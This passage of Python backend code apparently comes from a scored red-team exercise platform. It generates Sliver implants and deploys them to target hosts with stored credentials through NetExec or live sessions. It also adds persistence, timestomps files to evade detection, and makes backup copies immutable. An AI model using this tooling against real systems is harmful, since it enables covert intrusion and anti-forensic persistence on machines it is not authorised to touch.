                    ioc_name=auto_register_ioc_name,
                    deploy_dir=deploy_dir,
                )
                gw_hook = await _apply_persistence_post_deploy(
                    nxc=nxc, box_ip=ip, box_os=goos,
                    username=u, password=p,
                    binary_remote_path=binary_remote,
                    persistence_attr_name=gateway_persistence_name,
                    apply_immutable=apply_immutable,
                    immutable_scope=immutable_scope,
                    deploy_params=gw_pool_params or None,
                )
                r.update(gw_hook)
                gw_perr = persistence_step_failed(
                    gw_hook, requested=bool(gateway_persistence_name) or apply_immutable,
                )
                if gw_perr:
                    r["success"] = False
                    r["error"] = f"persistence: {gw_perr}"
                    continue
                if auto_register and auto_register_ioc_name:
                    gw_deployed_id = await _auto_register_deployed_ioc(
                        box_ip=ip,
                        ioc_name=auto_register_ioc_name,
                        persistence_name=gateway_persistence_name,
                        implant_identifier=sliver_name or None,
                        deployed_by=actor_username,
                        deploy_params=gw_pool_params or None,
                        computed_difficulty=computed_difficulty,
                    )
                    if gw_deployed_id:
                        r["deployed_ioc_id"] = gw_deployed_id
                    if gw_pool_params.get("BACKUP_DIR") and binary_path.exists():
                        _gw_bc = await _stage_backup_for_deploy(
                            box_ip=ip, box_os=goos, is_windows=False,
                            binary_path=binary_path, filename=r["filename"],
                            nxc=nxc,
                            timestomp=_resolve_ioc_flag(auto_register_ioc_name, "timestomp"),
                            deployed_ioc_id=gw_deployed_id,
                            ioc_name=auto_register_ioc_name,
                        )
                        if _gw_bc:
                            r["backup_copy_path"] = _gw_bc

        failed = [(r["host"], r.get("error", "")) for r in deploy_results if not r["success"]]
        if failed:
            logger.warning(
                "_generate_single_implant: deploy failed for %d/%d targets: %s",
                len(failed), len(deploy_results), failed,
            )
        successful_ips = [r["host"] for r in deploy_results if r["success"]]
    else:
        successful_ips = []

    last_deployed_ip = next((r["host"] for r in reversed(deploy_results) if r["success"]), None)
    last_deployed_path = next((r.get("path") for r in reversed(deploy_results) if r["success"]), None)

    # PLAN Phase 2b: DO NOT mutate db_session here. Return a `pending_writes`
    # payload; the caller applies it in a short write_actor.submit(...) after
    # this function returns. This is what closes the last bucket-A residual —
    # this fn's async compile + deploy no longer runs inside a write transaction.
    pending_writes: dict = {
        "implant_id": implant_id,
        "last_deployed_ip": last_deployed_ip,
        "last_deployed_path": last_deployed_path,
        "successful_ips": list(successful_ips),
    }
    if _existing:
        pending_writes["existing_id"] = _existing.id
        pending_writes["existing_updates"] = {
            "last_deployed_to": last_deployed_ip,
            "last_deployed_path": last_deployed_path,
            "pivot_set_id": pivot_set_id,
            "tcp_pivot_port": tcp_pivot_port,
            "c2_url_if_unknown": c2_url,
            "immutable_scope_if_unknown": (immutable_scope if apply_immutable else "none"),
        }
    else:
        pending_writes["new_build_kwargs"] = {
            "id": implant_id,
            "os": goos,
            "implant_type": implant_type,
            "arch": goarch,
            "format": fmt_str,
            "c2_url": c2_url,
            "filename": filename,
            # bare Sliver codename — matches implant_builds(), unlike the composite
            # filename; the staleness gate keys on this.
            "sliver_name": (Path(sliver_name).stem if sliver_name else None),
            "created_at": dt.datetime.now(dt.UTC),
            "last_deployed_to": last_deployed_ip,
            "last_deployed_path": last_deployed_path,
            "pivot_gateway": pivot_gateway,
            "pivot_set_id": pivot_set_id,
            "tcp_pivot_port": tcp_pivot_port,
            "persistence_mechanism": persistence_name,
            "immutable_scope": (immutable_scope if apply_immutable else "none"),
        }

    return {
        "build_id": implant_id,
        "filename": filename,
        "os": goos,
        "pivot_gateway": pivot_gateway,
        "pivot_set_id": pivot_set_id,
        "deploy_results": deploy_results,
        "pending_writes": pending_writes,
    }


def _apply_generate_pending_writes(db: Session, pending: dict) -> None:
    """Apply a `_generate_single_implant` pending_writes payload inside an actor
    transaction. Idempotent enough for retry: upserts the ImplantBuilds row and
    stamps Boxes.last_implant_id on each successful deploy IP.

    Runs INSIDE `write_actor.submit(...)` — do not await, do not call submit again.
    """
    implant_id = pending["implant_id"]
    if "existing_id" in pending:
        row = db.get(ImplantBuilds, pending["existing_id"])
        if row is not None:
            up = pending["existing_updates"]
            if up.get("last_deployed_to"):
                row.last_deployed_to = up["last_deployed_to"]
            if up.get("last_deployed_path"):
                row.last_deployed_path = up["last_deployed_path"]
            if up.get("pivot_set_id") and not row.pivot_set_id:
                row.pivot_set_id = up["pivot_set_id"]
            if up.get("tcp_pivot_port"):
                row.tcp_pivot_port = up["tcp_pivot_port"]
            if row.c2_url == "unknown":
                row.c2_url = up["c2_url_if_unknown"]
            if row.immutable_scope in (None, "unknown"):
                row.immutable_scope = up["immutable_scope_if_unknown"]
    elif "new_build_kwargs" in pending:
        db.add(ImplantBuilds(**pending["new_build_kwargs"]))
    for ip in pending.get("successful_ips", []):
        box = query_one(db, Boxes, box_ip=ip)
        if box:
            box.last_implant_id = implant_id


@router.post("/implants/generate", status_code=202)
async def generate_implant(
    body: ImplantGenerateRequest,
    current_user: Users = Depends(require_non_blue),
    force: bool = Query(default=False),
) -> dict[str, Any]:
    """Generate a Sliver implant.

    BOTH branches return {task_id} 202 immediately — the pivot-set branch is no
    longer synchronous (it compiles 3 implants per team through the global Sliver
    compile lock, which as a blocking call produced the httpx.ReadTimeout class;
    see _bg_generate_pivot_set and docs/PLAN_async_implant_deploy.md).
    Progress tracked via GET /c2/tasks/{task_id}. Single generate stores
    build_id + filename on task metadata_json once compile completes; the pivot
    branch stores the whole former-200 body (pivot_set_id + builds).
    """
    if config.DEV_MODE:
        raise HTTPException(status_code=503, detail="[DEV] Implant generation requires a live Sliver connection")

    _reject_beacon_over_pivot(body.is_beacon, body.c2_url)

    if body.pivot_team_nums is not None:
        # Pivot set compiles 3 implants per team through the global Sliver compile
        # lock — minutes of wall clock. Held open synchronously it produced the
        # httpx.ReadTimeout class (docs/PLAN_async_implant_deploy.md), so it is now
        # task-tracked like every other long operation. The full response body the
        # old 200 carried (pivot_set_id + builds) lands on metadata_json.
        pivot_task_id = create_task(
            "generate_pivot",
            current_user.username,
            body.pivot_team_nums[0] if body.pivot_team_nums else None,
            list(body.deploy_targets or []),
            metadata={"pivot_team_nums": list(body.pivot_team_nums)},
        )
        fire_and_forget(
            _bg_generate_pivot_set(pivot_task_id, body, current_user.username)
        )
        return {"task_id": pivot_task_id}

    if body.deploy_targets and not body.auto_register_ioc_name:
        raise HTTPException(
            status_code=422,
            detail=(
                "auto_register_ioc_name is required when deploy_targets is set "
                "(a deployed implant must register as a scored IOC)"
            ),
        )

    implant_type = "beacon" if body.is_beacon else "session"

    if not force:
        with Session(engine) as db:
            existing = db.execute(
                select(ImplantBuilds).where(
                    ImplantBuilds.os == body.os,
                    ImplantBuilds.implant_type == implant_type,
                    ImplantBuilds.arch == body.arch,
                    ImplantBuilds.format == body.format,
                    ImplantBuilds.c2_url == body.c2_url,
                )
            ).scalars().first()
        if existing:
            # Only treat it as a reusable duplicate if Sliver still knows its
            # sig-key. If the implant_config was pruned (clean_stale_implants /
            # Sliver restart), the row is stale — don't offer it as "use existing"
            # (that deploys a DOA binary); fall through to compile a fresh one.
            # Key on the bare Sliver codename (existing.sliver_name), not the
            # composite/masquerade filename stem which never matches. Fail-open when
            # the codename is unknown (disk-synced row) so a valid duplicate is still
            # reused rather than needlessly recompiled.
            _known = await _sliver_known_build_names()
            if _known is not None and existing.sliver_name and existing.sliver_name not in _known:
                logger.warning(
                    "generate: existing build %s (sliver=%s, file=%s) absent from Sliver "
                    "known builds — implant_config pruned; ignoring duplicate, compiling fresh",
                    existing.id, existing.sliver_name, existing.filename,
                )
                existing = None
        if existing:
            raise HTTPException(
                status_code=409,
                detail={
                    "detail": "Duplicate build",
                    "existing_build": {
                        "id": existing.id,
                        "os": existing.os,
                        "implant_type": existing.implant_type,
                        "arch": existing.arch,
                        "format": existing.format,
                        "c2_url": existing.c2_url,
                        "filename": existing.filename,
                        "created_at": existing.created_at.isoformat(),
                        "last_deployed_to": existing.last_deployed_to,
                    },
                },
            )

    task_type = "generate_deploy" if body.deploy_targets else "generate"
    task_id = create_task(
        task_type=task_type,
        operator=current_user.username,
        team_num=None,
        target_boxes=body.deploy_targets or [],
        metadata={
            "os": body.os,
            "arch": body.arch,
            "implant_type": implant_type,
            "format": body.format,
            "c2_url": body.c2_url,
        },
    )

    register_background_task(
        task_id, fire_and_forget(run_cancellable(task_id, _bg_generate(task_id, body, current_user.username))),
    )

    return {"task_id": task_id}


async def _stage_backup_copy(
    task_id: int,
    box_ip: str,
    local_path: "Path",
    backup_dir: str,
    filename: str,
    box_os: str,
    nxc: Any,
    protocol: str,
    cred: Any,
) -> bool:
    """Stage the implant binary to BACKUP_DIR on target. Returns True on success."""
    is_win = "windows" in box_os.lower()
    sep = "\\" if is_win else "/"
    remote_backup = f"{backup_dir.rstrip(sep)}{sep}{filename}"
    wire_path = remote_backup
    if is_win:
        # `nxc --put-file` writes relative to the C$ share and takes no share
        # argument, so a drive-qualified path is rejected with
        # 0xc0000033 STATUS_OBJECT_NAME_INVALID. Every Windows deploy-path pool
        # entry is drive-qualified ("C:\\Windows\\Temp", ...), so EVERY Windows
        # backup staging failed this way — silently, because the failure is only
        # a warning and the caller treats a missing backup as best-effort. The
        # recorded BACKUP_DIR must keep its "C:\\" form (check/remediate run ON
        # the box and need a real Windows path); only the wire path is stripped.
        _m = re.match(r"^([A-Za-z]):(.*)$", remote_backup, re.DOTALL)
        if _m:
            if _m.group(1).upper() != "C":
                logger.warning(
                    "_stage_backup_copy task=%d box=%s: BACKUP_DIR is on drive %s:, but "
                    "put_file can only reach C$ — refusing to write it to the wrong "
                    "volume (%s)", task_id, box_ip, _m.group(1), remote_backup,
                )
                return False
            wire_path = _m.group(2)
    try:
        res = await nxc.put_file_cred(  # nxc-wrapper-bypass: binary-deploy
            box_ip, protocol, cred, str(local_path), wire_path,
        )
        ok = res.success if res else False
        if ok:
            logger.info(
                "_stage_backup_copy task=%d box=%s: staged %s", task_id, box_ip, remote_backup,
            )
        else:
            logger.warning(
                "_stage_backup_copy task=%d box=%s: put_file failed: %s",
                task_id, box_ip, getattr(res, "error", ""),
            )
        return bool(ok)
    except Exception as exc:
        logger.warning("_stage_backup_copy task=%d box=%s: %s", task_id, box_ip, exc)
        return False


async def _apply_backup_immutable(
    box_ip: str,
    backup_path: str,
    box_os: str,
    nxc: Any,
    protocol: str,
    cred: Any,
) -> None:
    """Apply immutability to the backup copy (chattr +i / chflags schg / ICACLS deny)."""
    from fastapi_backend.netexec.script_wrapper import (
        build_inline_raw_command,  # cycle-break
    )
    try:
        os_lower = box_os.lower()
        if "windows" in os_lower:
            cmd = f'icacls "{backup_path}" /deny "Everyone:(W,D)"'
        elif "firewall" in os_lower or "pfsense" in os_lower or "freebsd" in os_lower:
            cmd = f'chflags schg "{backup_path}"'
        else:
            cmd = f'chattr +i "{backup_path}"'
        wrapped = build_inline_raw_command(cmd, box_os)
        await nxc.execute_cred(  # nxc-wrapper-bypass: wrapper-delivered
            box_ip, protocol, cred, wrapped,
            powershell="windows" in os_lower,
        )
        logger.info(
            "_apply_backup_immutable: applied immutable to %s on %s", backup_path, box_ip,
        )
    except Exception as exc:
        logger.warning("_apply_backup_immutable: failed for %s: %s", backup_path, exc)


# Sentinel handed to resolve_deploy_params when the binary's dir is unknown, so it
# records NO DROP_DIR instead of *picking* one the binary is not actually in.
_NO_DROP_DIR = "\x00no-drop-dir"


async def _resolve_implant_pool_params(
    *,
    box_ip: str,
    box_os: str,
    ioc_name: str | None,
    deploy_dir: str,
    backup_override: bool | None = None,
) -> dict[str, str]:
    """deploy_params for an implant that just landed: DROP_DIR + pooled names + BACKUP_DIR.

    DROP_DIR is a *fact* on this path — the deploy-path rotation already chose it —
    so it is recorded, never re-picked. Pooled artifact NAMES and BACKUP_DIR (one
    difficulty tier more obscure, distinct from DROP_DIR) are real pool picks.

    Shared by ``_bg_generate`` and ``_generate_single_implant`` (the pivot-set
    path). The pivot path previously recorded NO params at all, so pooled-name
    IOCs kept their hardcoded script defaults while check/remediate injected the
    pooled name, and ``backup_copy=True`` IOCs staged no copy because BACKUP_DIR
    was never chosen (docs/PLAN_build_check_deploy_name_pools.md §13).

    ``backup_override`` mirrors ``ImplantGenerateRequest.backup_copy_enabled``:
    None = follow the IOC definition, True/False = explicit operator override.
    Never raises — a failure logs loud and yields whatever was resolved.
    """
    params: dict[str, str] = {}
    if deploy_dir:
        params["DROP_DIR"] = deploy_dir
    if not ioc_name:
        return params
    try:
        from fastapi_backend.c2.deploy_params import (  # cycle-break
            build_ioc_pooled_map,
            cross_ioc_active_kind_names,
            existing_active_names,
            resolve_deploy_params,
        )
        from fastapi_backend.utils.dependencies import get_orchestrator  # cycle-break
        _loader = get_orchestrator().ioc_loader
        ioc_def = _loader.ioc_definitions.get(ioc_name)
        if ioc_def is None:
            return params
        name_keys = [k for k, _ in (getattr(ioc_def, "pooled_names", None) or [])]
        name_keys += [k for k, _, _ in (getattr(ioc_def, "pooled_name_lists", None) or [])]
        excl_names: dict[str, set[str]] = {}
        if name_keys:
            with Session(engine) as _db:
                excl_names = existing_active_names(_db, box_ip, ioc_name, name_keys)
                # Cross-IOC per-kind exclusion — see project_pool_name_svc_collision.
                _cross = cross_ioc_active_kind_names(
                    _db, box_ip, ioc_def,
                    build_ioc_pooled_map(_loader.ioc_definitions),
                )
                for _k, _vs in _cross.items():
                    excl_names.setdefault(_k, set()).update(_vs)
        needs_backup = (
            backup_override if backup_override is not None
            else bool(getattr(ioc_def, "backup_copy", False))
        )
        resolved = resolve_deploy_params(
            ioc_def, box_os,
            exclude_names=excl_names,
            needs_backup=needs_backup,
            fixed_drop_dir=deploy_dir or _NO_DROP_DIR,
        ) or {}
        if resolved.get("DROP_DIR") == _NO_DROP_DIR:
            resolved.pop("DROP_DIR", None)
        if backup_override is False:
            # Explicit operator opt-out beats the IOC's own backup_copy flag.
            resolved.pop("BACKUP_DIR", None)
        params.update(resolved)
    except Exception as exc:
        # Loud: a missed pool pick means the on-box artifact name / backup dir
        # diverges from what check + remediate inject — a scoring divergence,
        # not a nit.
        logger.warning(
            "implant pool params pick failed for %s on %s: %s", ioc_name, box_ip, exc,
        )
    return params


async def _stage_backup_for_deploy(
    *,
    box_ip: str,
    box_os: str,
    is_windows: bool,
    binary_path: "Path",
    filename: str,
    nxc: Any,
    timestomp: bool,
    deployed_ioc_id: int | None = None,
    ioc_name: str | None = None,
    task_id: int = 0,
) -> str | None:
    """Stage the backup copy, stomp it, lock it. Returns the remote path or None.

    BACKUP_DIR is read back from the *recorded* ``DeployedIOCs.deploy_params`` (by
    row id when known, else the newest active row for this box+IOC) because that
    row is what the check/restore path reads — staging anywhere else would be
    invisible to it. Runs after registration for the same reason.
    """
    from fastapi_backend.c2.deploy_params import recorded_params  # cycle-break

    backup_dir: str | None = None
    try:
        with Session(engine) as _bdb:
            if deployed_ioc_id:
                backup_dir = recorded_params(_bdb, deployed_ioc_id).get("BACKUP_DIR")
            elif ioc_name:
                _row = _bdb.execute(
                    select(DeployedIOCs).where(
                        DeployedIOCs.box_ip == box_ip,
                        DeployedIOCs.ioc_name == ioc_name,
                        DeployedIOCs.status == "active",
                    ).order_by(DeployedIOCs.id.desc())
                ).scalars().first()
                if _row:
                    backup_dir = _row.params_dict.get("BACKUP_DIR")
    except Exception as exc:
        logger.warning("_stage_backup_for_deploy: BACKUP_DIR lookup failed for %s: %s", box_ip, exc)
        return None
    if not backup_dir:
        return None

    protocol = "smb" if is_windows else "ssh"
    with Session(engine) as _cdb:
        cred = _get_best_cred(
            box_ip, _cdb, protocol=protocol, include_invalid=True, scoring_only=False,
        )
    if not cred:
        logger.warning("_stage_backup_for_deploy: no cred for %s — backup not staged", box_ip)
        return None

    staged = await _stage_backup_copy(
        task_id, box_ip, binary_path, backup_dir, filename, box_os, nxc, protocol, cred,
    )
    if not staged:
        return None

    sep = "\\" if is_windows else "/"
    remote_path = f"{backup_dir.rstrip(sep)}{sep}{filename}"
    if timestomp:
        from fastapi_backend.c2.timestomp import stomp_files_safe  # cycle-break
        with Session(engine) as _sdb:
            await stomp_files_safe(box_ip, [remote_path], box_os, _sdb)
    await _apply_backup_immutable(box_ip, remote_path, box_os, nxc, protocol, cred)
    logger.info("backup staged at %s for %s", remote_path, box_ip)
    return remote_path


async def _bg_generate(task_id: int, body: "ImplantGenerateRequest", actor_username: str) -> None:
    """Background: compile implant via Sliver gRPC, optionally deploy to targets."""
    # Hoisted to function scope on purpose: several per-box blocks below need the
    # orchestrator (pooled persistence names, BACKUP_DIR pick, backup_copy lookup).
    # A function-LOCAL import in only one of them made `get_orchestrator` a local
    # name for the whole function, so the earlier uses raised UnboundLocalError into
    # a swallowing `except` — silently disabling pooled-name and BACKUP_DIR picks.
    from fastapi_backend.utils.dependencies import get_orchestrator  # cycle-break

    from fastapi_backend.c2 import sliver_debug  # cycle-break
    sliver_debug.note_generate_start(f"task={task_id}")
    try:
        await _bg_generate_body(task_id, body, actor_username, get_orchestrator)
    finally:
        sliver_debug.note_generate_end(f"task={task_id}")


async def _bg_generate_body(task_id: int, body: "ImplantGenerateRequest", actor_username: str, get_orchestrator) -> None:
    """Real body of _bg_generate, split out so the tracer wrapper can own the try/finally."""
    start_task(task_id)
    implant_type = "beacon" if body.is_beacon else "session"

    # Dedup: check for an existing equivalent build before acquiring the compile lock.
    # Also validate against Sliver's live build list so a pruned implant_config
    # forces recompile rather than redeploying a DOA binary.
    _bg_sliver_names = await _sliver_known_build_names()
    with Session(engine) as _dedup_db:
        _existing = _find_matching_build(
            _dedup_db, body.os, body.arch, body.format, implant_type,
            body.c2_url, body.persistence_name, known_sliver_names=_bg_sliver_names,
        )

    if _existing:
        implant_id = _existing.id
        filename = _existing.filename
        # Preserve the reused build's sliver_name (see _generate_single_implant
        # for full rationale). NULL here made auto-register record
        # implant_identifier=NULL on every reused-build deploy, then SliverCheck
        # failed those rows with "No implant_identifier set for SliverCheck IOC".
        sliver_name = _existing.sliver_name
        binary_path = Path(config.IMPLANT_STORE_DIR) / implant_id / filename
        logger.info("_bg_generate task=%d: reusing build %s sliver=%s (%s/%s c2=%s)", task_id, implant_id, sliver_name, body.os, body.format, body.c2_url)
        update_task_metadata(task_id, {"build_id": implant_id, "filename": filename})
    else:
        try:
            client = _get_sliver_client()
            # Routing decision: linux/amd64 SHARED_LIB → external builder when
            # EXTERNAL_BUILDER_SO_LINUX is configured (docker/sliver-build/
            # container). Rationale: host Kali's glibc (2.42) taints native .so
            # builds with GLIBC_2.34, making them unloadable on any target with
            # glibc <2.34 (airship 2.28, polus 2.31). External path routes the
            # build to an ubuntu:18.04 container (glibc 2.27) → .so pinned to
            # GLIBC_2.4. Non-shared / non-linux builds keep the native path.
            _external_builder = _external_builder_for(body.os, body.format)
            if _external_builder:
                req_bytes = _build_external_generate_req_bytes(
                    builder_name=_external_builder,
                    goos=body.os, goarch=body.arch,
                    fmt=_IMPLANT_FORMAT_MAP.get(body.format, 0),
                    is_beacon=body.is_beacon,
                    beacon_interval_ns=body.beacon_interval * 1_000_000_000,
                    beacon_jitter_ns=(body.beacon_interval // 2) * 1_000_000_000,
                    c2_url=body.c2_url,
                    is_shared_lib=(body.format == "shared"),
                    exports=["RunSliver"] if body.format == "shared" else None,
                )
                generate_raw = client._channel.unary_unary(
                    "/rpcpb.SliverRPC/GenerateExternal",
                    request_serializer=lambda x: x,
                    response_deserializer=lambda x: x,
                )
            else:
                req_bytes = _build_generate_req_bytes(
                    goos=body.os,
                    goarch=body.arch,
                    fmt=_IMPLANT_FORMAT_MAP.get(body.format, 0),
                    is_beacon=body.is_beacon,
                    beacon_interval_ns=body.beacon_interval * 1_000_000_000,
                    beacon_jitter_ns=(body.beacon_interval // 2) * 1_000_000_000,
                    c2_url=body.c2_url,
                    is_shared_lib=(body.format == "shared"),
                    exports=["RunSliver"] if body.format == "shared" else None,
                )
                generate_raw = client._channel.unary_unary(
                    "/rpcpb.SliverRPC/Generate",
                    request_serializer=lambda x: x,
                    response_deserializer=lambda x: x,
                )
        except HTTPException as exc:
            finish_task(task_id, "failed")
            logger.error("_bg_generate task=%d: setup failed: %s", task_id, exc.detail)
            return
        except Exception as exc:
            finish_task(task_id, "failed")
            logger.error("_bg_generate task=%d: unexpected setup error: %s", task_id, exc, exc_info=True)
            return

        # Wait for compile lock. `status` stays 'running' throughout (start_task fired
        # above, by design), so the queued-vs-working signal rides on current_phase +
        # metadata.queue_position instead — that is what lets a poller distinguish
        # "4th in line behind other compiles" from "started and then hung".
        def _on_enqueue(position: int, _tid: int = task_id) -> None:
            set_phase(_tid, "queued")
            update_task_metadata(_tid, {"queue_position": position})

        def _on_acquire(_tid: int = task_id) -> None:
            set_phase(_tid, "compiling")

        try:
            response_bytes, _queue_position = await _serialized_sliver_compile(
                generate_raw, req_bytes, on_enqueue=_on_enqueue, on_acquire=_on_acquire
            )
        except TimeoutError:
            finish_task(task_id, "failed")
            logger.error("_bg_generate task=%d: compile timed out", task_id)
            return
        except Exception as exc:
            finish_task(task_id, "failed")
            logger.error("_bg_generate task=%d: compile error: %s", task_id, exc)
            return

        set_phase(task_id, None)

        try:
            if _external_builder:
                # External path: response is ExternalImplantConfig; server has
                # created a PENDING build row and dispatched to the container
                # builder. Poll Regenerate until the builder finishes and
                # SaveBuild stores the bytes.
                _build_id, sliver_name = _parse_external_config_response(response_bytes)
                logger.info(
                    "_bg_generate task=%d: external build dispatched to %s "
                    "sliver=%s build_id=%s (awaiting compile)",
                    task_id, _external_builder, sliver_name, _build_id,
                )
                set_phase(task_id, "external-compiling")
                binary_data = await _await_external_build_bytes(
                    client, sliver_name, timeout_s=600,
                )
                set_phase(task_id, None)
            else:
                sliver_name, binary_data = _parse_generate_response(response_bytes)
        except (ValueError, TimeoutError) as exc:
            finish_task(task_id, "failed")
            logger.error("_bg_generate task=%d: parse/await error: %s", task_id, exc)
            return

        implant_id = str(uuid.uuid4())
        # Shared-lib builds keep a .so local name (self-describing in the store);
        # only the on-target dest_fname strips the extension. ELF-magic scrub is
        # extension-agnostic, so this is cosmetic-but-clearer (plan D5).
        if body.os == "windows":
            ext = "exe"
        elif body.format == "shared":
            ext = "so"
        else:
            ext = "elf"
        if body.implant_name:
            filename = f"{body.implant_name}.{ext}"
        else:
            filename = f"{naming_pool_manager.pick_implant_name(body.os)}.{ext}"

        store_dir = Path(config.IMPLANT_STORE_DIR) / implant_id
        store_dir.mkdir(parents=True, exist_ok=True)
        binary_path = store_dir / filename
        binary_path.write_bytes(binary_data)
        binary_path.chmod(0o755)

        update_task_metadata(task_id, {"build_id": implant_id, "filename": filename})

    # --- Deploy phase ---
    deploy_results: list[dict] = []
    if body.deploy_targets:
        from fastapi_backend.c2.bulk_exec import resolve_implant_for_box  # cycle-break

        set_phase(task_id, "deploying")
        for ip in body.deploy_targets:
            update_box_progress(task_id, ip, "running")

        try:
            nxc = _get_nxc_wrapper()
        except HTTPException:
            for ip in body.deploy_targets:
                update_box_progress(task_id, ip, "failed", error="NXC not available")
            finish_task(task_id, "failed")
            return

        deploy_tasks: list[tuple[str, str, str, bool]] = []
        session_deploy_tasks: list[tuple[str, Any, bool, str]] = []  # (ip, interact, is_win, method)
        cred_by_ip: dict[str, tuple[str, str, bool]] = {}  # ip -> (username, password, is_win)
        with Session(engine) as db:
            for ip in body.deploy_targets:
                box = query_one(db, Boxes, box_ip=ip)
                is_win = "windows" in (box.os or "").lower() if box else False
                # Generate-page deploy uses normal operator creds, not red_scoring
                # — see docs/PLAN_operator_ux.md § C. (IOC check/deploy/remediate
                # and the pivot-set path in _generate_pivot_ioc_set are unchanged
                # and still route through red_scoring; this cred is only used
                # here as the NXC fallback and for the persistence-apply step
                # below, which remains NXC-based regardless of delivery channel.)
                # Deploy-all overrides via body.use_scoring_cred so IOC implant
                # deploys authenticate as the root-equivalent scoring account
                # (fixes EACCES on /usr/lib etc. when the operator login is a
                # non-root wheel user like testing_inventory blackteam).
                _use_scoring = bool(
                    body.use_scoring_cred and config.RED_SCORING_ENABLED
                )
                cred = _get_best_cred(
                    ip, db, protocol="smb" if is_win else "ssh",
                    include_invalid=True, scoring_only=_use_scoring,
                )
                if not cred:
                    update_box_progress(task_id, ip, "failed", error="No credentials")
                    deploy_results.append({"host": ip, "success": False, "error": "No credentials"})
                    continue
                cred_by_ip[ip] = (cred.username, cred.password, is_win)

                # Prefer an existing live Sliver session/beacon on this box to
                # deliver the new binary — avoids NXC entirely for the upload
                # itself. Persistence-apply below still authenticates via NXC
                # regardless of which channel delivered the binary. Resolution
                # is best-effort: any failure here (Sliver client hiccup, no
                # implants yet, etc.) must fall through to the NXC path for
                # this box rather than aborting the whole deploy for every box.
                interact = None
                chosen_method = ""
                try:
                    for method in ("session", "beacon"):
                        impl_id = await resolve_implant_for_box(ip, None, method)
                        if not impl_id:
                            continue
                        client = _get_sliver_client()
                        interact = (
                            await client.interact_session(impl_id) if method == "session"
                            else await client.interact_beacon(impl_id)
                        )
                        if interact is not None:
                            chosen_method = method
                            break
                except Exception as exc:
                    logger.warning(
                        "_bg_generate: session/beacon resolution failed for %s (%s); falling back to NXC",
                        ip, exc,
                    )
                    interact = None
                # Shared-lib deploys must use the loader-aware NXC path
                # (_deploy_one_implant); the session-delivery optimization
                # uploads+execs the binary directly and can't launch a .so.
                if interact is not None and body.format != "shared":
                    session_deploy_tasks.append((ip, interact, is_win, chosen_method))
                else:
                    deploy_tasks.append((ip, cred.username, cred.password, is_win))

        binary_data_for_session = (
            await asyncio.to_thread(binary_path.read_bytes)
            if session_deploy_tasks else b""
        )
        _difficulty = _resolve_ioc_difficulty(body.auto_register_ioc_name)

        # Shared-lib implants need a native loader deployed beside the .so (the
        # .so isn't executable). Resolve iocs/payloads/so_loader_{goos} once.
        # Missing binary → graceful degrade (plan Part E, DoD #8): deploy still
        # proceeds and _deploy_one_implant attempts the .so directly (fails loud
        # on FreeBSD, logged) rather than crashing the whole generate.
        _shared_lib_loader: Path | None = None
        if body.format == "shared" and body.os in ("freebsd", "linux"):
            _loader_path = Path(config.PROJECT_ROOT) / "iocs" / "payloads" / f"so_loader_{body.os}"
            if _loader_path.exists():
                _shared_lib_loader = _loader_path
            else:
                logger.warning(
                    "_bg_generate task=%d: shared-lib loader not found at %s; deploy will "
                    "attempt the .so as an executable (fails on FreeBSD). "
                    "Run scripts/build/build_so_loader.sh.", task_id, _loader_path,
                )

        gathered_nxc = await asyncio.gather(*[
            _deploy_one_implant(nxc, binary_path, filename, ip, uname, pwd, is_win, goos=body.os,
                                avoid_tmpfs=body.apply_immutable, difficulty=_difficulty,
                                shared_lib_loader=_shared_lib_loader)
            for ip, uname, pwd, is_win in deploy_tasks
        ])
        gathered_session = await asyncio.gather(*[
            _deploy_one_implant_via_session(interact, binary_data_for_session, filename, ip, is_win,
                                            method, goos=body.os, difficulty=_difficulty)
            for ip, interact, is_win, method in session_deploy_tasks
        ])
        gathered = [*gathered_nxc, *gathered_session]
        deploy_results.extend(gathered)

        for r in gathered:
            ip = r["host"]
            if not r["success"]:
                update_box_progress(task_id, ip, "failed", error=r.get("error"),
                                    exec_path=r.get("delivery_method") or "nxc")
                continue

            if ip in cred_by_ip:
                uname, pwd, is_win = cred_by_ip[ip]
                box_os = "windows" if is_win else body.os
                deploy_dir = r.get("path") or ""
                sep = "\\" if is_win else "/"
                binary_remote = f"{deploy_dir.rstrip(sep)}{sep}{r['filename']}" if deploy_dir else r["filename"]

                # Stomp BEFORE immutability + persistence — chattr +i / chflags
                # schg block subsequent touch / debugfs writes.
                if body.timestomp and binary_remote:
                    from fastapi_backend.c2.timestomp import (
                        stomp_files_safe,  # cycle-break
                    )
                    # Shared-lib deploy also drops a loader binary beside the .so
                    # (r["loader_dest"]) — stomp it too, in the same pre-immutability
                    # pass, so a `find -newer` sweep doesn't flag it (plan Part I).
                    _stomp_targets = [binary_remote]
                    if r.get("loader_dest"):
                        _stomp_targets.append(r["loader_dest"])
                    with Session(engine) as _db:
                        stomp = await stomp_files_safe(ip, _stomp_targets, box_os, _db)
                    r["timestomp"] = stomp.to_metadata(enabled=True)

                # Pool-driven deploy params, resolved BEFORE
                # _apply_persistence_post_deploy so the persistence deploy script
                # receives the pooled artifact NAMES (e.g. C3R_SERVICE_NAME) and
                # C3R_BACKUP_DIR in the same NXC round-trip. DROP_DIR is the dir
                # the rotation already deployed into (B10: was never recorded).
                _pers_params = await _resolve_implant_pool_params(
                    box_ip=ip, box_os=box_os,
                    ioc_name=body.auto_register_ioc_name,
                    deploy_dir=deploy_dir,
                    backup_override=body.backup_copy_enabled,
                )

                hook_result = await _apply_persistence_post_deploy(
                    nxc=nxc, box_ip=ip, box_os=box_os,
                    username=uname, password=pwd,
                    binary_remote_path=binary_remote,
                    persistence_attr_name=body.persistence_name,
                    apply_immutable=body.apply_immutable,
                    immutable_scope=body.immutable_scope,
                    timestomp=body.timestomp,
                    deploy_params=_pers_params or None,
                    # Shared-lib deploys drop a loader beside the .so; the
                    # persistence script relaunches via it (C3R_LOADER_PATH).
                    loader_remote_path=r.get("loader_dest"),
                )
                r.update(hook_result)

                # F1: a requested persistence step that failed means the named
                # persistence artifact never landed — the box is NOT deployed,
                # even though the beacon binary is on disk + checked in.  Mark
                # failed so the child task (and the parent deploy_all IOC entry)
                # reflect it instead of silently reporting "done".
                perr = persistence_step_failed(
                    hook_result,
                    requested=bool(body.persistence_name) or body.apply_immutable,
                )
                if perr:
                    update_box_progress(
                        task_id, ip, "failed",
                        error=f"persistence: {perr}",
                        exec_path="nxc",
                        details=json.dumps({k: v for k, v in r.items() if k != "host"}),
                    )
                    continue

                # Mandatory: every implant that lands on a box registers as an IOC.
                deployed_ioc_id = await _auto_register_deployed_ioc(
                    box_ip=ip,
                    ioc_name=body.auto_register_ioc_name,
                    persistence_name=body.persistence_name,
                    implant_identifier=sliver_name or None,
